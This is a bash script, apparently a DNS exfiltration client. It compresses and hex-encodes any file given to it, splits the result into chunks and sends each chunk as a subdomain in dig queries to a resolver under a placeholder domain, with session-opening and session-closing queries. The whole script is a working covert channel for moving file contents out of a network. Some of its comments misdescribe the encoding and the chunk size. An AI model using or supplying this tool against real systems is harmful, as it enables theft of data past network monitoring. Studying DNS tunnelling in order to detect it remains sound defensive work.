#!/bin/bash

DOMAIN_NAME="domain.ltd"


function main() {
    # Check if a file path is provided
    if [ -z "$1" ]; then
        echo "Usage: $0 <file-path>"
        exit 1
    fi

    # Assign the file path to a variable
    FILE_PATH="$1"

    tmp_file=$(mktemp)

    # Compress the file, encode it to Base64, and then split into 32-character chunks
    cat "$FILE_PATH" | gzip | xxd -p | fold -w63 > $tmp_file
    LINES=$(wc -l < $tmp_file | awk '{$1=$1};1')

    # Initialize chunk counter
    COUNTER=0

    clean_filename=$(basename $1 | sed 's/\./_/g')
    SESSION_ID=$(dig +short $clean_filename.s.$DOMAIN_NAME @127.0.0.1 -p 1053 | cut -d '.' -f 4)

    # Read the split file line by line
    while IFS= read -r line; do
        echo "Part $COUNTER/$LINES"

        # Construct the DNS query using the chunk and counter
        QUERY="${line}.${COUNTER}.${SESSION_ID}.${DOMAIN_NAME}"

        response=$(dig $QUERY +short @127.0.0.1 -p 1053) &

        # Increment the counter
        ((COUNTER++))
    done < $tmp_file

    wait

    # Close session
    response=$(dig +short 1.$SESSION_ID.$DOMAIN_NAME @127.0.0.1 -p 1053)

    rm $tmp_file
}

main "$@"
